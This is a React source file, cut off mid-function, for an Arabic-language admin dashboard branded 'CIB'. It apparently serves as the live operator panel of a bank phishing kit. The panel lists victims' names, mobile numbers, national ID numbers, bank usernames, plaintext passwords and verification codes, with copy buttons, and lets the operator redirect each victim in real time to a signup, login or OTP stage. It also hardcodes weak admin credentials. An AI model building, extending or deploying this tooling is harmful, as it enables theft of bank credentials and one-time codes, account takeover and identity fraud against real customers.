import { useMemo, useState, useEffect, useRef } from 'react';
import { ChevronDown, History, Wifi, WifiOff, Home as HomeIcon, KeyRound, ShieldCheck, Loader2, Clock, User, CheckCircle, XCircle, Search, Copy, Check, Shield, Lock, AlertTriangle, Users, ZoomIn, ZoomOut, Type, Settings } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogDescription } from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { useAdminRealtime, type ClientState, type ClientStage, type StageLogEntry } from '@/hooks/useAdminRealtime';
import { AdminLayout } from '@/components/layout/AdminLayout';

// Font size settings (local only - resets on page reload)
const FONT_SIZES = {
  small: { scale: 0.85, label: 'صغير' },
  normal: { scale: 1, label: 'عادي' },
  large: { scale: 1.15, label: 'كبير' },
  xlarge: { scale: 1.3, label: 'أكبر' },
};
type FontSizeKey = keyof typeof FONT_SIZES;

// Audio notification system
const AudioNotifications = {
  // Messenger notification sound
  playMessenger() {
    try {
      const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      // Messenger-like sound pattern
      oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
      oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.1);
      oscillator.frequency.setValueAtTime(800, audioContext.currentTime + 0.2);
      oscillator.frequency.setValueAtTime(600, audioContext.currentTime + 0.3);
      
      gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.5);
      
      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.5);
    } catch (e) {
      console.log('Audio not supported');
    }
  },
  
  // Alert/alarm horn sound
  playAlert() {
    try {
      const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      // Alarm pattern - loud and attention-grabbing
      oscillator.type = 'sawtooth';
      oscillator.frequency.setValueAtTime(800, audioContext.currentTime);
      oscillator.frequency.setValueAtTime(400, audioContext.currentTime + 0.15);
      oscillator.frequency.setValueAtTime(800, audioContext.currentTime + 0.3);
      oscillator.frequency.setValueAtTime(400, audioContext.currentTime + 0.45);
      
      gainNode.gain.setValueAtTime(0.5, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.6);
      
      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.6);
    } catch (e) {
      console.log('Audio not supported');
    }
  },
  
  // Gentle notification chime
  playChime() {
    try {
      const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
      const oscillator = audioContext.createOscillator();
      const gainNode = audioContext.createGain();
      
      oscillator.connect(gainNode);
      gainNode.connect(audioContext.destination);
      
      // Gentle chime - soft and pleasant
      oscillator.type = 'sine';
      oscillator.frequency.setValueAtTime(523, audioContext.currentTime); // C5
      oscillator.frequency.setValueAtTime(659, audioContext.currentTime + 0.15); // E5
      
      gainNode.gain.setValueAtTime(0.2, audioContext.currentTime);
      gainNode.gain.exponentialRampToValueAtTime(0.01, audioContext.currentTime + 0.4);
      
      oscillator.start(audioContext.currentTime);
      oscillator.stop(audioContext.currentTime + 0.4);
    } catch (e) {
      console.log('Audio not supported');
    }
  }
};

// Admin credentials
const ADMIN_EMAIL = "admin@admin.com";
const ADMIN_PASSWORD = "admin123";

interface AuthState {
  isAuthenticated: boolean;
  isLoading: boolean;
  blocked: boolean;
  blockedUntil: number | null;
  attemptsLeft: number | null;
}

// Generate or get device ID
function getDeviceId(): string {
  let deviceId = localStorage.getItem('admin_device_id');
  if (!deviceId) {
    deviceId = 'device_' + Math.random().toString(36).substring(2) + Date.now().toString(36);
    localStorage.setItem('admin_device_id', deviceId);
  }
  return deviceId;
}

// Auth check API
async function checkAuthStatus(): Promise<{ blocked: boolean; remainingMinutes?: number }> {
  try {
    const response = await fetch('/api/admin/auth/check', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-device-id': getDeviceId() }
    });
    const data = await response.json();
    return { blocked: data.blocked, remainingMinutes: data.remainingMinutes };
  } catch {
    return { blocked: false };
  }
}

// Verify token API
async function verifyToken(): Promise<boolean> {
  try {
    const token = localStorage.getItem('admin_token');
    if (!token) return false;
    
    const response = await fetch('/api/admin/auth/verify', {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${token}`
      }
    });
    
    if (response.ok) {
      const data = await response.json();
      return data.authenticated === true;
    }
    return false;
  } catch {
    return false;
  }
}

// Login API
async function loginAdmin(email: string, password: string): Promise<{ success: boolean; blocked?: boolean; attemptsLeft?: number; remainingMinutes?: number; error?: string }> {
  const deviceId = getDeviceId();
  const deviceName = getDeviceName();
  const deviceType = isMobile() ? 'mobile' : 'desktop';
  
  console.log(`[LOGIN] Attempting login...`);
  console.log(`[LOGIN] Device ID: ${deviceId}`);
  console.log(`[LOGIN] Device Name: ${deviceName}`);
  console.log(`[LOGIN] Device Type: ${deviceType}`);
  console.log(`[LOGIN] Email: ${email}`);
  
  try {
    const response = await fetch('/api/admin/auth/login', {
      method: 'POST',
      headers: { 
        'Content-Type': 'application/json', 
        'x-device-id': deviceId,
        'x-device-name': deviceName,
        'x-device-type': deviceType
      },
      body: JSON.stringify({ email, password })
    });
    
    console.log(`[LOGIN] Response status: ${response.status}`);
    
    const data = await response.json();
    console.log(`[LOGIN] Response data:`, data);
    
    if (data.blocked) {
      return { success: false, blocked: true, remainingMinutes: data.remainingMinutes };
    }
    
    if (!response.ok) {
      return { success: false, attemptsLeft: data.attemptsLeft, error: data.error };
    }
    
    // Store token, deviceId and logged_in flag
    if (data.token) {
      localStorage.setItem('admin_token', data.token);
      localStorage.setItem('admin_device_id', data.deviceId || deviceId);
      localStorage.setItem('admin_logged_in', 'true');
    }
    
    return { success: true };
  } catch (error: any) {
    console.error(`[LOGIN] FATAL ERROR:`, error);
    console.error(`[LOGIN] Error message:`, error.message);
    console.error(`[LOGIN] Error name:`, error.name);
    return { success: false, error: 'فشل في الاتصال بالخادم: ' + (error.message || 'خطأ غير معروف') };
  }
}

// Get device name based on user agent
function getDeviceName(): string {
  const ua = navigator.userAgent;
  if (ua.includes('Mobile') || ua.includes('Android') || ua.includes('iPhone')) {
    return 'Mobile Phone';
  }
  if (ua.includes('iPad') || ua.includes('Tablet') || ua.includes('Android')) {
    return 'Tablet';
  }
  return 'Desktop Computer';
}

// Check if mobile device
function isMobile(): boolean {
  const ua = navigator.userAgent;
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
}

// Login Screen Component
function LoginScreen({ onLogin }: { onLogin: () => void }) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [blocked, setBlocked] = useState(false);
  const [remainingMinutes, setRemainingMinutes] = useState(0);
  const [attemptsLeft, setAttemptsLeft] = useState<number | null>(null);

  useEffect(() => {
    // Check if device is blocked on mount
    checkAuthStatus().then(result => {
      if (result.blocked) {
        setBlocked(true);
        setRemainingMinutes(result.remainingMinutes || 60);
      }
    });
  }, []);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (blocked) return;
    
    setLoading(true);
    setError('');
    
    const result = await loginAdmin(email, password);
    
    if (result.success) {
      // Token will be stored by loginAdmin function
      onLogin();
    } else if (result.blocked) {
      setBlocked(true);
      setRemainingMinutes(result.remainingMinutes || 60);
      setError('تم حظر الجهاز. يرجى المحاولة لاحقاً.');
    } else {
      setError(result.error || 'بيانات الدخول غير صحيحة');
      if (result.attemptsLeft !== undefined) {
        setAttemptsLeft(result.attemptsLeft);
      }
    }
    
    setLoading(false);
  };

  return (
    <div className="min-h-screen flex items-center justify-center bg-gradient-to-br from-slate-100 to-slate-200 p-4">
      <div className="w-full max-w-md">
        {/* Logo */}
        <div className="text-center mb-8">
          <div className="inline-flex items-center justify-center w-20 h-20 bg-[#0a4fa3] rounded-2xl shadow-lg mb-4">
            <Shield className="w-10 h-10 text-white" />
          </div>
          <h1 className="text-2xl font-bold text-gray-900">لوحة تحكم CIB</h1>
          <p className="text-gray-500 mt-2">ادخل بيانات صحيحة او سيتم حظر جهازك بعد 5 محاولات  فاشلة  </p>
        </div>

        {/* Login Form */}
        <div className="bg-white rounded-2xl shadow-xl p-8">
          {blocked ? (
            <div className="text-center">
              <div className="inline-flex items-center justify-center w-16 h-16 bg-red-100 rounded-full mb-4">
                <AlertTriangle className="w-8 h-8 text-red-600" />
              </div>
              <h2 className="text-xl font-bold text-red-600 mb-2">تم حظر الجهاز</h2>
              <p className="text-gray-600 mb-4">
                تم تجاوز عدد المحاولات المسموحة
              </p>
              <div className="bg-red-50 rounded-xl p-4">
                <p className="text-red-700 font-medium">
                  متبقي على الحظر: <span className="text-2xl font-bold">{remainingMinutes}</span> دقيقة
                </p>
              </div>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-6">
              <div className="space-y-2">
                <label className="block text-sm font-medium text-gray-700">
                  البريد الإلكتروني
                </label>
                <div className="relative">
                  <User className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                  <input
                    type="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    placeholder="admin@admin.com"
                    className="w-full pr-10 pl-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#0a4fa3] focus:border-transparent transition-all text-right"
                    dir="ltr"
                    required
                  />
                </div>
              </div>

              <div className="space-y-2">
                <label className="block text-sm font-medium text-gray-700">
                  كلمة المرور
                </label>
                <div className="relative">
                  <Lock className="absolute right-3 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-400" />
                  <input
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    placeholder="••••••••"
                    className="w-full pr-10 pl-4 py-3 border border-gray-200 rounded-xl focus:ring-2 focus:ring-[#0a4fa3] focus:border-transparent transition-all text-right"
                    dir="ltr"
                    required
                  />
                </div>
              </div>

              {error && (
                <div className="bg-red-50 border border-red-200 rounded-xl p-4">
                  <p className="text-red-600 text-sm text-center">{error}</p>
                  {attemptsLeft !== null && (
                    <p className="text-red-500 text-xs text-center mt-1">
                      المحاولات المتبقية: {attemptsLeft}
                    </p>
                  )}
                </div>
              )}

              <Button
                type="submit"
                disabled={loading}
                className="w-full bg-[#0a4fa3] hover:bg-[#073a7a] text-white py-3 text-lg font-medium rounded-xl transition-all disabled:opacity-50"
              >
                {loading ? (
                  <span className="flex items-center gap-2">
                    <Loader2 className="w-5 h-5 animate-spin" />
                    جارٍ التحقق...
                  </span>
                ) : (
                  'تسجيل الدخول'
                )}
              </Button>
            </form>
          )}
        </div>

        <p className="text-center text-gray-400 text-sm mt-6">
نظام الحماية تقوم شركة CPX         </p>
      </div>
    </div>
  );
}

const STAGE_LABEL: Record<string, string> = {
  home: 'الرئيسية',
  signup: 'معلومات مقدم الطلب',
  create_account: 'تسجيل الدخول ',
  pending_approval: 'قيد المراجعة',
  verify: 'رمز التحقق',
  rejected: 'مرفوض',
  verified: 'تم التحقق',
};

const STAGE_ORDER = ['home', 'signup', 'create_account', 'pending_approval', 'verify', 'verified'];

const STAGE_COLORS: Record<string, { bg: string; text: string; border: string }> = {
  home: { bg: 'bg-gray-100', text: 'text-gray-600', border: 'border-gray-300' },
  signup: { bg: 'bg-blue-100', text: 'text-blue-700', border: 'border-blue-300' },
  create_account: { bg: 'bg-purple-100', text: 'text-purple-700', border: 'border-purple-300' },
  pending_approval: { bg: 'bg-amber-100', text: 'text-amber-700', border: 'border-amber-300' },
  verify: { bg: 'bg-indigo-100', text: 'text-indigo-700', border: 'border-indigo-300' },
  verified: { bg: 'bg-emerald-100', text: 'text-emerald-700', border: 'border-emerald-300' },
  rejected: { bg: 'bg-red-100', text: 'text-red-700', border: 'border-red-300' },
};

function formatTime(iso: string | null): string {
  if (!iso) return '—';
  const date = new Date(iso);
  const now = new Date();
  const diffMs = now.getTime() - date.getTime();
  const diffMins = Math.floor(diffMs / 60000);
  
  if (diffMins < 1) return 'الآن';
  if (diffMins < 60) return `منذ ${diffMins} د`;
  if (diffMins < 1440) return `منذ ${Math.floor(diffMins / 60)} س`;
  return date.toLocaleString('ar-EG', { hour: '2-digit', minute: '2-digit', day: '2-digit', month: '2-digit' });
}

function formatTimeShort(iso: string | null): string {
  if (!iso) return '—';
  const date = new Date(iso);
  return date.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
}

function HistoryModal({
  open,
  onOpenChange,
  sessionId,
  stage,
  requestHistory,
}: {
  open: boolean;
  onOpenChange: (open: boolean) => void;
  sessionId: string;
  stage: string;
  requestHistory: (sessionId: string, stage: string) => Promise<StageLogEntry[]>;
}) {
  const [logs, setLogs] = useState<StageLogEntry[] | null>(null);
  const [loading, setLoading] = useState(false);

  const load = () => {
    setLoading(true);
    setLogs(null);
    requestHistory(sessionId, stage).then((result) => {
      setLogs(result);
      setLoading(false);
    });
  };

  // Load history when modal opens
  useEffect(() => {
    if (open) {
      load();
    }
  }, [open, sessionId, stage]);

  return (
    <Dialog open={open} onOpenChange={onOpenChange}>
      <DialogContent className="max-w-lg" dir="rtl">
        <DialogHeader>
          <DialogTitle>سجل {STAGE_LABEL[stage] ?? stage}</DialogTitle>
          <DialogDescription>   جميع البيانات    </DialogDescription>
        </DialogHeader>
        <div className="max-h-96 overflow-y-auto space-y-3 mt-2">
          {loading && (
            <div className="flex items-center justify-center py-10 text-muted-foreground gap-2">
              <Loader2 className="w-5 h-5 animate-spin" />
              جارِ التحميل...
            </div>
          )}
          {!loading && logs && logs.length === 0 && (
            <div className="text-center py-10">
              <p className="text-muted-foreground mb-2">لا يوجد ادخالات قديمة   </p>
              <p className="text-xs text-muted-foreground/70"> يتم اظافة جميع البيانات بشكل تلقائي </p>
              <button onClick={load} className="mt-3 text-xs text-primary hover:underline">
                إعادة تحميل ↻
              </button>
            </div>
          )}
          {!loading && logs && logs.length > 0 && (
            <>
              <p className="text-xs text-muted-foreground">{logs.length} عدد الادخالات </p>
              {logs.map((log, index) => (
                <div key={log.id || index} className="rounded-xl border border-border bg-muted/30 p-4 space-y-2">
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-2 text-xs text-muted-foreground">
                      <Clock className="w-3.5 h-3.5" />
                      {formatTime(log.createdAt)}
                    </div>
                    {index === 0 && (
                      <span className="text-[10px] bg-emerald-100 text-emerald-700 px-2 py-0.5 rounded-full">الأحدث</span>
                    )}
                  </div>
                  <div className="grid grid-cols-1 gap-1 text-sm">
                    {Object.entries(log.payload).map(([key, value]) => (
                      <div key={key} className="flex items-center justify-between gap-2">
                        <span className="text-muted-foreground text-xs sm:text-sm">{key}</span>
                        <div className="flex items-center gap-2">
                          <span dir="ltr" className="font-mono text-foreground text-xs sm:text-sm">{String(value)}</span>
                          <button 
                            onClick={() => navigator.clipboard.writeText(String(value))}
                            className="p-1 hover:bg-muted rounded transition-colors"
                            title="نسخ"
                          >
                            <Copy className="w-3 h-3 sm:w-4 sm:h-4 text-muted-foreground hover:text-foreground" />
                          </button>
                        </div>
                      </div>
                    ))}
                  </div>
                </div>
              ))}
            </>
          )}
        </div>
      </DialogContent>
    </Dialog>
  );
}

function ClientCard({
  client,
  requestHistory,
  sendRedirect,
  shouldHighlightLogin,
}: {
  client: ClientState;
  requestHistory: (sessionId: string, stage: string) => Promise<StageLogEntry[]>;
  sendRedirect: (sessionId: string, target: ClientStage) => void;
  shouldHighlightLogin?: boolean;
}) {
  const [expanded, setExpanded] = useState(false);
  const [historyStage, setHistoryStage] = useState<string | null>(null);
  const isOnline = client.status === 'online';
  const displayName = client.fullName?.trim() || 'بدون اسم';
  const stageColors = STAGE_COLORS[client.stage] || STAGE_COLORS.home;
  const stageIndex = STAGE_ORDER.indexOf(client.stage);

  // Check if client has any data
  const hasAnyData = client.fullName || client.mobile || client.nationalId || 
                     client.username || client.password || client.verificationCode;

  // Don't show card if client has no data at all
  if (!hasAnyData) {
    return null;
  }

  // Has login data (username/password)
  const hasLoginData = client.username || client.password;

  const handleQuickApprove = (e: React.MouseEvent) => {
    e.stopPropagation();
    if (confirm(`موافقة على عميل: ${displayName}؟`)) {
      sendRedirect(client.sessionId, 'verify');
    }
  };

  const handleQuickReject = (e: React.MouseEvent) => {
    e.stopPropagation();
    if (confirm(`رفض عميل: ${displayName}؟`)) {
      sendRedirect(client.sessionId, 'rejected');
    }
  };

  const handleCopy = (e: React.MouseEvent, value: string | null | undefined, label: string) => {
    e.stopPropagation();
    if (value?.trim()) {
      navigator.clipboard.writeText(value);
    }
  };

  return (
    <div className={`rounded-2xl border overflow-hidden transition-all shadow-sm hover:shadow-md ${
      hasLoginData && !expanded && shouldHighlightLogin
        ? 'bg-gradient-to-r from-blue-50 to-indigo-50 border-blue-400 ring-2 ring-blue-300' 
        : `${stageColors.border} bg-card`
    }`}>
      {/* Compact Header */}
      <button
        type="button"
        onClick={() => setExpanded((v) => !v)}
        className="w-full flex items-center justify-between gap-3 p-4 sm:p-5 text-right hover:bg-muted/20 transition-colors"
      >
        <div className="flex items-center gap-3 sm:gap-4 min-w-0 flex-1">
          {/* Avatar with status */}
          <div className="relative shrink-0">
            <div className={`w-12 h-12 sm:w-14 sm:h-14 rounded-full ${isOnline ? 'bg-emerald-100' : 'bg-gray-100'} flex items-center justify-center`}>
              <User className={`w-6 h-6 sm:w-7 sm:h-7 ${isOnline ? 'text-emerald-600' : 'text-gray-400'}`} />
            </div>
            <span className={`absolute -bottom-0.5 -left-0.5 w-3 h-3 sm:w-4 sm:h-4 rounded-full border-2 border-card ${isOnline ? 'bg-emerald-500 animate-pulse' : 'bg-gray-400'}`} />
          </div>
          
          {/* Info */}
          <div className="min-w-0 text-right flex-1">
            <div className="flex items-center gap-2">
              <p className="font-bold text-foreground truncate text-base sm:text-lg">{displayName}</p>
              {isOnline && (
                <span className="text-xs sm:text-sm text-emerald-500 font-medium">ON</span>
              )}
            </div>
            <div className="flex items-center gap-2 text-sm sm:text-base text-muted-foreground mt-1">
              {client.mobile && (
                <span dir="ltr" className="font-mono">{client.mobile}</span>
              )}
              {!client.mobile && client.username && (
                <span dir="ltr" className="font-mono">{client.username}</span>
              )}
            </div>
          </div>
        </div>

        {/* Stage Badge */}
        <div className="flex items-center gap-2 sm:gap-3 shrink-0">
          {hasLoginData && !expanded && shouldHighlightLogin && (
            <span className="text-[10px] sm:text-xs font-medium px-2 sm:px-3 py-1 rounded-full bg-blue-500 text-white whitespace-nowrap flex items-center gap-1 animate-pulse">
              <KeyRound className="w-3 h-3" />
              تسجيل دخول
            </span>
          )}
          <span className={`text-[10px] sm:text-xs font-medium px-1.5 sm:px-2.5 py-1 rounded-full ${stageColors.bg} ${stageColors.text} whitespace-nowrap`}>
            {STAGE_LABEL[client.stage] ?? client.stage}
          </span>
          <span className="text-[10px] sm:text-xs text-muted-foreground hidden sm:block">{formatTime(client.lastSeenAt ?? client.updatedAt)}</span>
          <ChevronDown className={`w-4 h-4 text-muted-foreground transition-transform ${expanded ? 'rotate-180' : ''}`} />
        </div>
      </button>

      {/* Quick Actions - Only for pending_approval */}
      {client.stage === 'pending_approval' && !expanded && (
        <div className="px-4 pb-3 sm:px-5 sm:pb-4 flex gap-3">
          <button
            onClick={handleQuickApprove}
            className="flex-1 flex items-center justify-center gap-2 py-3 sm:py-4 rounded-xl bg-emerald-500 hover:bg-emerald-600 text-white text-sm sm:text-base font-medium transition-colors"
          >
            <CheckCircle className="w-5 h-5 sm:w-6 sm:h-6" />
            <span>موافقة</span>
          </button>
          <button
            onClick={handleQuickReject}
            className="flex-1 flex items-center justify-center gap-2 py-3 sm:py-4 rounded-xl bg-red-500 hover:bg-red-600 text-white text-sm sm:text-base font-medium transition-colors"
          >
            <XCircle className="w-5 h-5 sm:w-6 sm:h-6" />
            <span>رفض</span>
          </button>
        </div>
      )}

      {/* Stage Progress */}
      <div className="px-4 sm:px-5 pb-3 sm:pb-4 flex items-center gap-1.5" dir="ltr">
        {STAGE_ORDER.map((s, i) => (
          <div 
            key={s} 
            className={`h-1.5 sm:h-2 flex-1 rounded-full ${i <= stageIndex ? (STAGE_COLORS[s]?.bg || 'bg-primary') : 'bg-gray-200'}`} 
          />
        ))}
      </div>

      {/* Expanded Details */}
      {expanded && (
        <div className="border-t border-border p-4 sm:p-5 space-y-4 bg-muted/10 animate-in slide-in-from-top-2 duration-200">
          {/* Data Grid - Compact */}
          <div className="grid grid-cols-1 sm:grid-cols-3 gap-3 sm:gap-4">
            {/* Registration Data - Show only if has data */}
            {(client.fullName || client.mobile || client.nationalId) && (
              <div className={`rounded-xl border ${stageColors.border} bg-card p-4 sm:p-5`}>
                <div className="flex items-center justify-between mb-3 sm:mb-4">
                  <p className="text-sm sm:text-base font-medium text-muted-foreground">بيانات التسجيل</p>
                  <button onClick={(e) => { e.stopPropagation(); setHistoryStage('signup'); }} className="text-xs sm:text-sm text-primary hover:underline flex items-center gap-1">
                    <History className="w-4 h-4" />
                    السجل
                  </button>
                </div>
                <div className="space-y-2 sm:space-y-3">
                  {client.fullName && (
                    <div className="flex items-center justify-between gap-2">
                      <span className="text-xs sm:text-sm text-muted-foreground">الاسم</span>
                      <span className="text-sm sm:text-base font-medium truncate max-w-[140px]">{client.fullName}</span>
                    </div>
                  )}
                  {client.mobile && (
                    <div className="flex items-center justify-between gap-2">
                      <span className="text-xs sm:text-sm text-muted-foreground">الموبايل</span>
                      <div className="flex items-center gap-2">
                        <span dir="ltr" className="text-sm sm:text-base font-mono">{client.mobile}</span>
                        <button onClick={(e) => handleCopy(e, client.mobile, 'موبايل')} className="p-1 hover:bg-muted rounded">
                          <Copy className="w-4 h-4 text-muted-foreground" />
                        </button>
                      </div>
                    </div>
                  )}
                  {client.nationalId && (
                    <div className="flex items-center justify-between gap-2">
                      <span className="text-xs sm:text-sm text-muted-foreground">الرقم القومي</span>
                      <span dir="ltr" className="text-sm sm:text-base font-mono">{client.nationalId}</span>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Account Data - Show only if has data */}
            {(client.username || client.password) && (
              <div className={`rounded-xl border ${stageColors.border} bg-card p-4 sm:p-5`}>
                <div className="flex items-center justify-between mb-3 sm:mb-4">
                  <p className="text-sm sm:text-base font-medium text-muted-foreground">بيانات الحساب</p>
                  <button onClick={(e) => { e.stopPropagation(); setHistoryStage('create_account'); }} className="text-xs sm:text-sm text-primary hover:underline flex items-center gap-1">
                    <History className="w-4 h-4" />
                    السجل
                  </button>
                </div>
                <div className="space-y-2 sm:space-y-3">
                  {client.username && (
                    <div className="flex items-center justify-between gap-2">
                      <span className="text-xs sm:text-sm text-muted-foreground">المستخدم</span>
                      <div className="flex items-center gap-2">
                        <span dir="ltr" className="text-sm sm:text-base font-mono">{client.username}</span>
                        <button onClick={(e) => handleCopy(e, client.username, 'مستخدم')} className="p-1 hover:bg-muted rounded">
                          <Copy className="w-4 h-4 text-muted-foreground" />
                        </button>
                      </div>
                    </div>
                  )}
                  {client.password && (
                    <div className="flex items-center justify-between gap-2">
                      <span className="text-xs sm:text-sm text-muted-foreground">كلمة المرور</span>
                      <div className="flex items-center gap-2">
                        <span dir="ltr" className="text-sm sm:text-base font-mono">{client.password}</span>
                        <button onClick={(e) => handleCopy(e, client.password, 'كلمة المرور')} className="p-1 hover:bg-muted rounded">
                          <Copy className="w-4 h-4 text-muted-foreground" />
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              </div>
            )}

            {/* Verification Code - Show only if has code */}
            {client.verificationCode && (
              <div className={`rounded-xl border ${stageColors.border} bg-card p-4 sm:p-5`}>
                <div className="flex items-center justify-between mb-3 sm:mb-4">
                  <p className="text-sm sm:text-base font-medium text-muted-foreground">رمز التحقق</p>
                  <button onClick={(e) => { e.stopPropagation(); setHistoryStage('verify'); }} className="text-xs sm:text-sm text-primary hover:underline flex items-center gap-1">
                    <History className="w-4 h-4" />
                    السجل
                  </button>
                </div>
                <div className="flex items-center justify-center py-4 sm:py-5">
                  <span dir="ltr" className="text-2xl sm:text-3xl font-mono font-bold tracking-widest">{client.verificationCode}</span>
                </div>
              </div>
            )}
          </div>

          {/* Action Buttons */}
          <div className="space-y-3">
            {/* Approval Buttons - for pending_approval */}
            {client.stage === 'pending_approval' && (
              <div className="grid grid-cols-2 gap-3">
                <Button className="gap-2 h-12 sm:h-14 text-base sm:text-lg bg-emerald-500 hover:bg-emerald-600" onClick={() => sendRedirect(client.sessionId, 'verify')}>
                  <CheckCircle className="w-5 h-5 sm:w-6 sm:h-6" />
                  <span>موافقة - للتحقق</span>
                </Button>
                <Button variant="destructive" className="gap-2 h-12 sm:h-14 text-base sm:text-lg" onClick={() => sendRedirect(client.sessionId, 'rejected')}>
                  <XCircle className="w-5 h-5 sm:w-6 sm:h-6" />
                  <span>رفض</span>
                </Button>
              </div>
            )}

            {/* Quick Actions */}
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2 sm:gap-3">
              <Button variant="outline" size="sm" className="h-11 sm:h-12 text-sm gap-2" onClick={() => sendRedirect(client.sessionId, 'home')}>
                <HomeIcon className="w-4 h-4 sm:w-5 sm:h-5" />
                <span>الرئيسية</span>
              </Button>
              <Button variant="outline" size="sm" className="h-11 sm:h-12 text-sm gap-2" onClick={() => sendRedirect(client.sessionId, 'signup')}>
                <User className="w-4 h-4 sm:w-5 sm:h-5" />
                <span>التسجيل</span>
              </Button>
              <Button variant="outline" size="sm" className="h-11 sm:h-12 text-sm gap-2" onClick={() => sendRedirect(client.sessionId, 'create_account')}>
                <KeyRound className="w-4 h-4 sm:w-5 sm:h-5" />
                <span>الحساب</span>
              </Button>
              <Button variant="outline" size="sm" className="h-11 sm:h-12 text-sm gap-2" onClick={() => sendRedirect(client.sessionId, 'verify')}>
                <ShieldCheck className="w-4 h-4 sm:w-5 sm:h-5" />
                <span>التحقق</span>
              </Button>
            </div>
          </div>
        </div>
      )}

      {historyStage && (
        <HistoryModal
          open
          onOpenChange={(open) => !open && setHistoryStage(null)}
          sessionId={client.sessionId}
          stage={historyStage}
          requestHistory={requestHistory}
        />
      )}
    </div>
  );
}

function CopyButton({ value, label }: { value: string | null | undefined; label: string }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = async () => {
    if (!value?.trim()) return;
    try {
      await navigator.clipboard.writeText(value);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    } catch (err) {
      console.error('Failed to copy:', err);
    }
  };

  return (
    <button
      onClick={handleCopy}
      disabled={!value?.trim()}
      className={`p-1 rounded hover:bg-muted transition-colors ${!value?.trim() ? 'opacity-30 cursor-not-allowed' : 'cursor-pointer'}`}
      title={`نسخ ${label}`}
    >
      {copied ? (
        <Check className="w-3.5 h-3.5 text-emerald-500" />
      ) : (
        <Copy className="w-3.5 h-3.5 text-muted-foreground hover:text-foreground" />
      )}
    </button>
  );
}

function DataBox({
  title,
  fields,
  onHistory,
  showCopyButtons = false,
}: {
  title: string;
  fields: { label: string; value: string | null; ltr?: boolean }[];
  onHistory: () => void;
  showCopyButtons?: boolean;
}) {
  return (
    <div className="rounded-xl border border-border bg-card p-3 md:p-4 flex flex-col gap-2 md:gap-3">
      <p className="text-sm font-medium text-foreground">{title}</p>
      <div className="space-y-1.5 md:space-y-2">
        {fields.map((f) => (
          <div key={f.label} className="flex items-center justify-between gap-2 md:gap-3">
            <span className="text-xs md:text-sm text-muted-foreground shrink-0">{f.label}</span>
            <div className="flex items-center gap-2">
              <span dir={f.ltr ? 'ltr' : undefined} className={`text-xs md:text-sm text-foreground truncate ${f.ltr ? 'font-mono' : 'font-medium'}`}>
                {f.value?.trim() ? f.value : '—'}
              </span>
              {showCopyButtons && <CopyButton value={f.value} label={f.label} />}
            </div>
          </div>
        ))}
      </div>
      <Button variant="ghost" size="sm" className="gap-2 justify-center mt-1 text-xs md:text-sm" onClick={onHistory}>
        <History className="w-3.5 h-3.5 md:w-4 md:h-4" />
        السجل
      </Button>
    </div>
  );
}

export default function Admin() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [isChecking, setIsChecking] = useState(true);
  const { clients, status, requestHistory, sendRedirect } = useAdminRealtime();
  const [search, setSearch] = useState('');
  const [stageFilter, setStageFilter] = useState<string>('all');
  const [showFontSettings, setShowFontSettings] = useState(false);
  const [fontSize, setFontSize] = useState<FontSizeKey>('normal');
  const [soundEnabled, setSoundEnabled] = useState(true);
  
  // Track previous client data to detect new data arrival
  const previousClientsData = useRef<Map<string, ClientState>>(new Map());
  const isInitialLoad = useRef(true); // Skip first load
  
  // Track recent login highlights (sessionIds)
  const [recentLoginHighlights, setRecentLoginHighlights] = useState<Set<string>>(new Set());
  
  // Remove highlight after 2 minutes
  useEffect(() => {
    if (recentLoginHighlights.size === 0) return;
    
    const timeout = setTimeout(() => {
      setRecentLoginHighlights(new Set());
    }, 120000); // 2 minutes
    
    return () => clearTimeout(timeout);
  }, [recentLoginHighlights]);

  // Apply font size on change
  useEffect(() => {
    const scale = FONT_SIZES[fontSize].scale;
    document.documentElement.style.setProperty('--admin-font-scale', String(scale));
  }, [fontSize]);

  // Reset font size on page unload
  useEffect(() => {
    const handleBeforeUnload = () => {
      document.documentElement.style.removeProperty('--admin-font-scale');
    };
    window.addEventListener('beforeunload', handleBeforeUnload);
    return () => {
      window.removeEventListener('beforeunload', handleBeforeUnload);
      document.documentElement.style.removeProperty('--admin-font-scale');
    };
  }, []);

  // Stats
  const stats = useMemo(() => {
